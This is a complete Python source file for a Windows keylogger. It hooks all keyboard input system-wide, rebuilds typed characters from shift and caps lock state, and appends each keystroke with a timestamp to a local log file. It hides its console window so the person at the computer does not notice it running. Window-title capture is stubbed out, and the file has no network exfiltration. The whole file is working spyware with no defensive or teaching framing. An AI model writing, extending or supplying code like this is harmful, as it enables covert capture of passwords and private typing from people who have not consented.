import keyboard
import ctypes
import win32gui
import win32con
import time
from datetime import datetime

LOG_FILE = "keystrokes.log"
is_caps = False
is_shift = False

def get_current_window():
    hwnd = win32gui.GetForegroundWindow()
    length = win32gui.GetWindowTextLength(hwnd) + 1
    buffer = ctypes.create_unicode_buffer(length)
    win32gui.GetWindowText(hwnd, buffer, length)
    return buffer.value

def update_modifiers(event):
    global is_shift, is_caps
    if event.name == 'shift':
        is_shift = not event.event_type == 'up'
    elif event.name == 'caps lock' and event.event_type == 'down':
        is_caps = not is_caps

def key_handler(event):
    global is_shift, is_caps
    update_modifiers(event)
    
    
    if event.event_type == 'down':
        try:
            #current_window = get_current_window()
            current_window = "todo"
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key = event.name
            
            special_keys = {
                'space': ' ',
                'enter': '\n',
                'tab': '\t',
                'backspace': '[BACKSPACE]',
                'esc': '[ESC]',
                'ctrl': '[CTRL]',
                'alt': '[ALT]'
            }
            
            if len(key) > 1:
                key = special_keys.get(key, f'[{key.upper()}]')
            else:
                key = key.upper() if (is_shift or is_caps) else key.lower()

            
            

            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{timestamp} [{current_window}] {key}\n")
                print(key)
        except Exception as e:
            pass

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), win32con.SW_HIDE)

if __name__ == "__main__":
    hide_console()
    keyboard.hook(key_handler)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keyboard.unhook_all()